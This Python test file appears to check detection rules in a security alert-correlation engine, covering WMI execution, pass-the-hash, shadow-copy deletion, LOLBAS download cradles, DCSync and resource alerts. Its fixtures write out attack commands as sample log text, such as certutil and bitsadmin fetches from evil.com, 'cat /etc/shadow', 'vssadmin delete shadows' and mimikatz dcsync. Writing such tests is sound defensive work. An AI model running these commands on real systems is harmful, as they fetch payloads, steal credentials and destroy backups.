        assert self.rule.match([_a(rule_desc='OAuth token issued successfully')]) is None


class TestCR036_WMIExecution:
    rule = WMIExecution()

    def test_positive_wmic_in_desc(self):
        assert self.rule.match([_a(rule_desc='wmic process call create cmd.exe')]) is not None

    def test_positive_wmiprvse(self):
        assert self.rule.match([_a(rule_desc='wmiprvse.exe spawned process')]) is not None

    def test_positive_raw_log(self):
        assert self.rule.match([_a(raw_log='wmic  execute remote command')]) is not None

    def test_negative_normal(self):
        assert self.rule.match([_a(rule_desc='scheduled maintenance task')]) is None


class TestCR037_PassTheHash:
    rule = PassTheHash()

    def test_positive_pth_keyword(self):
        assert self.rule.match([_a(rule_desc='pass-the-hash authentication detected')]) is not None

    def test_positive_ntlm_relay(self):
        assert self.rule.match([_a(rule_desc='NTLM relay attack ntlmrelayx')]) is not None

    def test_positive_cred_dump_then_ntlm_logon(self):
        alerts = [
            _a(rule_desc='lsass memory dump mimikatz'),
            _a(rule_id=60106, src_ip='10.0.0.5'),
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_normal_logon(self):
        assert self.rule.match([_a(rule_id=60106, src_ip='10.0.0.1')]) is None


class TestCR038_MFAPushBombing:
    rule = MFAPushBombing()

    def test_positive_10_prompts_same_user(self):
        alerts = [
            _a(rule_desc='mfa prompt sent', username='alice')
            for _ in range(10)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_9_prompts(self):
        alerts = [
            _a(rule_desc='mfa prompt sent', username='alice')
            for _ in range(9)
        ]
        assert self.rule.match(alerts) is None

    def test_negative_prompts_different_users(self):
        alerts = [
            _a(rule_desc='mfa prompt sent', username=f'user{i}')
            for i in range(15)
        ]
        assert self.rule.match(alerts) is None


class TestCR039_SessionCookieTheft:
    rule = SessionCookieTheft()

    def test_positive_cookie_theft_keyword(self):
        assert self.rule.match([_a(rule_desc='session cookie theft detected')]) is not None

    def test_positive_pass_the_cookie(self):
        assert self.rule.match([_a(rule_desc='pass-the-cookie replay attack')]) is not None

    def test_positive_3_distinct_ips_same_user(self):
        """Heuristic: same user from 3+ IPs → token theft."""
        alerts = [
            _a(rule_id=5715, username='alice', src_ip=f'10.0.0.{i}')
            for i in range(3)
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_2_ips(self):
        alerts = [
            _a(rule_id=5715, username='alice', src_ip=f'10.0.0.{i}')
            for i in range(2)
        ]
        assert self.rule.match(alerts) is None


class TestCR040_Cryptomining:
    rule = CryptominingDetection()

    def test_positive_xmrig_keyword(self):
        assert self.rule.match([_a(rule_desc='xmrig process detected')]) is not None

    def test_positive_stratum_protocol(self):
        assert self.rule.match([_a(rule_desc='connection to stratum+tcp://pool')]) is not None

    def test_positive_3_mining_port_hits(self):
        alerts = [_a(rule_desc='connection port 3333') for _ in range(3)]
        assert self.rule.match(alerts) is not None

    def test_negative_normal_traffic(self):
        assert self.rule.match([_a(rule_desc='HTTP GET request port 80')]) is None


class TestCR041_ShadowCopyDeletion:
    rule = ShadowCopyDeletion()

    def test_positive_vssadmin_delete(self):
        assert self.rule.match([_a(rule_desc='vssadmin delete shadows /all')]) is not None

    def test_positive_wmic_shadowcopy(self):
        assert self.rule.match([_a(raw_log='wmic shadowcopy delete')]) is not None

    def test_positive_bcdedit(self):
        assert self.rule.match([_a(rule_desc='bcdedit /set recoveryenabled no executed')]) is not None

    def test_negative_normal_vss(self):
        assert self.rule.match([_a(rule_desc='VSS writer started backup')]) is None

    def test_positive_confidence_very_high(self):
        r = self.rule.match([_a(rule_desc='vssadmin delete shadows')])
        assert r['confidence'] == 0.97


class TestCR042_LOLBASDownload:
    rule = LOLBASDownloadCradle()

    def test_positive_certutil_urlcache(self):
        assert self.rule.match([_a(rule_desc='certutil -urlcache -split http://evil.com/payload')]) is not None

    def test_positive_bitsadmin_transfer(self):
        assert self.rule.match([_a(rule_desc='bitsadmin /transfer job http://evil.com')]) is not None

    def test_positive_mshta_http(self):
        assert self.rule.match([_a(raw_log='mshta http://remote.script.hta')]) is not None

    def test_negative_certutil_normal(self):
        assert self.rule.match([_a(rule_desc='certutil -verify certificate.cer')]) is None


class TestCR043_DGA:
    rule = DGADetection()

    def test_positive_dga_keyword(self):
        assert self.rule.match([_a(rule_desc='DGA domain query detected')]) is not None

    def test_positive_high_entropy_domain(self):
        assert self.rule.match([_a(rule_desc='high entropy domain suspicious dns request')]) is not None

    def test_negative_normal_dns(self):
        assert self.rule.match([_a(rule_desc='DNS query for google.com')]) is None


class TestCR044_AutomatedCollection:
    rule = AutomatedCollection()

    def test_positive_collection_command(self):
        assert self.rule.match([_a(rule_desc='find / -name *.doc executed')]) is not None

    def test_positive_30_fim_same_host(self):
        alerts = [_a(category='fim', agent_id='victim') for _ in range(30)]
        assert self.rule.match(alerts) is not None

    def test_negative_29_fim(self):
        alerts = [_a(category='fim', agent_id='victim') for _ in range(29)]
        assert self.rule.match(alerts) is None


class TestCR045_ArchiveCollectedData:
    rule = ArchiveCollectedData()

    def test_positive_7z_on_etc(self):
        assert self.rule.match([_a(rule_desc='7z  archive /etc/ directory')]) is not None

    def test_positive_tar_on_home(self):
        assert self.rule.match([_a(raw_log='tar czf backup.tgz /home/user/documents')]) is not None

    def test_negative_7z_on_safe_path(self):
        assert self.rule.match([_a(rule_desc='7z  archive /opt/app/vendor/')]) is None


class TestCR046_PhishingAttachment:
    rule = PhishingAttachmentExec()

    def test_positive_macro_enabled(self):
        assert self.rule.match([_a(rule_desc='macro enabled document opened')]) is not None

    def test_positive_vba_macro(self):
        assert self.rule.match([_a(rule_desc='VBA macro execution detected')]) is not None

    def test_positive_winword_spawned(self):
        assert self.rule.match([_a(rule_desc='winword spawned child process')]) is not None

    def test_negative_normal_office(self):
        assert self.rule.match([_a(rule_desc='Microsoft Word document saved')]) is None


class TestCR047_StartupFolderPersistence:
    rule = StartupFolderPersistence()

    def test_positive_windows_startup_folder(self):
        alerts = [_a(category='fim',
                     file_path='C:\\Users\\bob\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mal.exe')]
        assert self.rule.match(alerts) is not None

    def test_positive_linux_init_d(self):
        alerts = [_a(category='fim', file_path='/etc/init.d/malicious')]
        assert self.rule.match(alerts) is not None

    def test_negative_normal_file(self):
        alerts = [_a(category='fim', file_path='/home/bob/documents/report.docx')]
        assert self.rule.match(alerts) is None


class TestCR048_CronPersistence:
    rule = CronPersistence()

    def test_positive_etc_crontab(self):
        assert self.rule.match([_a(rule_desc='/etc/crontab modification detected')]) is not None

    def test_positive_crontab_e(self):
        assert self.rule.match([_a(raw_log='crontab -e executed by user')]) is not None

    def test_positive_systemd_timer(self):
        assert self.rule.match([_a(rule_desc='new systemd .timer unit enabled')]) is not None

    def test_negative_cron_daemon_start(self):
        """'cron daemon started scheduled task' has no CRON_KEYWORDS → no match."""
        assert self.rule.match([_a(rule_desc='cron daemon started scheduled task')]) is None

    def test_positive_new_cron_keyword(self):
        """'new cron' is in CRON_KEYWORDS."""
        assert self.rule.match([_a(rule_desc='new cron job entry detected')]) is not None


class TestCR049_AccessTokenManipulation:
    rule = AccessTokenManipulation()

    def test_positive_juicypotato(self):
        assert self.rule.match([_a(rule_desc='JuicyPotato token impersonation')]) is not None

    def test_positive_sweetpotato(self):
        assert self.rule.match([_a(raw_log='sweetpotato token theft')]) is not None

    def test_positive_seimpersonateprivilege(self):
        assert self.rule.match([_a(rule_desc='SeImpersonatePrivilege abused')]) is not None

    def test_negative_normal_runas(self):
        assert self.rule.match([_a(rule_desc='runas command executed successfully')]) is None


class TestCR050_RemoteServiceCreation:
    rule = RemoteServiceCreation()

    def test_positive_psexec_remote(self):
        assert self.rule.match([_a(rule_desc='psexec \\\\ remote service started')]) is not None

    def test_positive_sc_exe_remote(self):
        assert self.rule.match([_a(raw_log='sc \\\\ remote create binpath=malware.exe')]) is not None

    def test_positive_sc_create_local_fires_too(self):
        """'sc create' is in SVC_KEYWORDS — fires on any sc create, local or remote."""
        assert self.rule.match([_a(rule_desc='sc create local service')]) is not None

    def test_negative_unrelated_service_event(self):
        """Service running message has no SVC_KEYWORDS → no match."""
        assert self.rule.match([_a(rule_desc='service running normally')]) is None


class TestCR051_DLLHijacking:
    rule = DLLHijacking()

    def test_positive_dll_hijack_keyword(self):
        assert self.rule.match([_a(rule_desc='DLL hijack detected in chrome.exe')]) is not None

    def test_positive_dll_side_load(self):
        assert self.rule.match([_a(rule_desc='dll side-load from appdata detected')]) is not None

    def test_negative_normal_dll_load(self):
        assert self.rule.match([_a(rule_desc='DLL loaded kernel32.dll')]) is None


class TestCR052_HTTPSLongPollC2:
    rule = HTTPSLongPollC2()

    def test_positive_cobalt_strike(self):
        assert self.rule.match([_a(rule_desc='Cobalt Strike beacon checkin detected')]) is not None

    def test_positive_havoc_c2(self):
        assert self.rule.match([_a(rule_desc='Havoc C2 framework implant callback')]) is not None

    def test_positive_metasploit(self):
        assert self.rule.match([_a(rule_desc='Metasploit meterpreter C2 callback')]) is not None

    def test_negative_normal_https(self):
        assert self.rule.match([_a(rule_desc='HTTPS connection to api.github.com')]) is None


class TestCR053_CredentialsInFiles:
    rule = CredentialsInFiles()

    def test_positive_grep_password(self):
        assert self.rule.match([_a(rule_desc='grep -r password executed in /home')]) is not None

    def test_positive_cat_shadow(self):
        assert self.rule.match([_a(rule_desc='cat /etc/shadow executed')]) is not None

    def test_positive_reg_query(self):
        assert self.rule.match([_a(raw_log='reg query HKLM\\SAM')]) is not None

    def test_negative_normal_grep(self):
        assert self.rule.match([_a(rule_desc='grep -n import requirements.txt')]) is None


class TestCR054_SMBShareEnumeration:
    rule = SMBShareEnumeration()

    def test_positive_net_view(self):
        assert self.rule.match([_a(rule_desc='net view command executed')]) is not None

    def test_positive_sharphound(self):
        assert self.rule.match([_a(rule_desc='SharpHound AD enumeration detected')]) is not None

    def test_positive_crackmapexec_smb(self):
        assert self.rule.match([_a(raw_log='crackmapexec smb target enumeration')]) is not None

    def test_positive_net_user_fires_via_net_use_substring(self):
        """'net use' is a substring of 'net user' — this is a known match (T1087)."""
        assert self.rule.match([_a(rule_desc='net user add john')]) is not None

    def test_negative_no_smb_keyword(self):
        """SMTP connection has no SMB_KEYWORDS → no match."""
        assert self.rule.match([_a(rule_desc='smtp connection established to mail.example.com')]) is None


class TestCR055_DCSync:
    rule = DCSyncAttack()

    def test_positive_dcsync_keyword(self):
        assert self.rule.match([_a(rule_desc='DCSync attack detected via drsuapi')]) is not None

    def test_positive_mimikatz_dcsync(self):
        assert self.rule.match([_a(raw_log='mimikatz lsadump::dcsync /domain:corp')]) is not None

    def test_positive_secretsdump(self):
        assert self.rule.match([_a(rule_desc='impacket secretsdump DC replication')]) is not None

    def test_negative_normal_replication(self):
        assert self.rule.match([_a(rule_desc='AD replication completed successfully')]) is None

    def test_positive_confidence_very_high(self):
        r = self.rule.match([_a(rule_desc='dcsync attack getncchanges')])
        assert r['confidence'] == 0.95


class TestCR056_HighResourceUtilization:
    rule = HighResourceUtilization()

    def test_positive_cpu_rule_id(self):
        """Alert with Wazuh rule_id 101004 (high_cpu) fires CR-056 with 2+ hits."""
        alerts = [
            _a(rule_id='101004', rule_desc='CyCentra 360: High CPU utilization 94% on web01'),
            _a(rule_id='101004', rule_desc='CyCentra 360: High CPU utilization 96% on web01'),
        ]
        assert self.rule.match(alerts) is not None

    def test_positive_disk_rule_id(self):
        """Alert with Wazuh rule_id 101005 (high_disk) fires with 2+ hits."""
        alerts = [
            _a(rule_id='101005', rule_desc='CyCentra 360: High disk utilization 87% on db01'),
            _a(rule_id='101005', rule_desc='CyCentra 360: High disk utilization 89% on db01'),
        ]
        assert self.rule.match(alerts) is not None

    def test_positive_memory_keyword(self):
        """Keyword 'high memory utilization' in rule_desc fires the rule."""
        alerts = [
            _a(rule_desc='CyCentra 360: High memory utilization 92% on app01'),
            _a(rule_desc='CyCentra 360: High memory utilization 95% on app01'),
        ]
        assert self.rule.match(alerts) is not None

    def test_positive_mixed_resource_types(self):
        """CPU + Disk alerts together fire the rule and label both types in detail."""
        alerts = [
            _a(rule_id='101004', rule_desc='CyCentra 360: High CPU utilization 93% on host1'),
            _a(rule_id='101005', rule_desc='CyCentra 360: High disk utilization 88% on host1'),
        ]
        result = self.rule.match(alerts)
        assert result is not None
        assert 'CPU' in result['detail']
        assert 'Disk' in result['detail']

    def test_positive_sustained_rule_id(self):
        """Sustained breach rule_id 101007 (level 10 aggregator) fires with 2+ hits."""
        alerts = [
            _a(rule_id='101007', rule_desc='CyCentra 360: Sustained resource utilization breach on host1'),
            _a(rule_id='101007', rule_desc='CyCentra 360: Sustained resource utilization breach on host1'),
        ]
        assert self.rule.match(alerts) is not None

    def test_negative_single_alert(self):
        """Only 1 resource alert — not enough to fire (threshold is 2+)."""
        assert self.rule.match([
            _a(rule_id='101004', rule_desc='CyCentra 360: High CPU utilization 91% on host1'),
        ]) is None

    def test_negative_no_resource_keywords(self):
        """Unrelated alerts — no resource rule IDs or keywords — no match."""
        assert self.rule.match([
            _a(rule_desc='SSH login failed for user root'),
            _a(rule_desc='Failed password for invalid user admin'),
        ]) is None

    def test_result_contract(self):
        """Result dict has key_alert_ids, detail, confidence."""
        alerts = [
            _a(wazuh_id='w100', rule_id='101004', rule_desc='CyCentra 360: High CPU utilization 94% on host1'),
            _a(wazuh_id='w101', rule_id='101006', rule_desc='CyCentra 360: High memory utilization 91% on host1'),
        ]
        r = self.rule.match(alerts)
        assert r is not None
        assert 'key_alert_ids' in r
        assert 'detail' in r
        assert 'confidence' in r
        assert r['confidence'] == 0.80
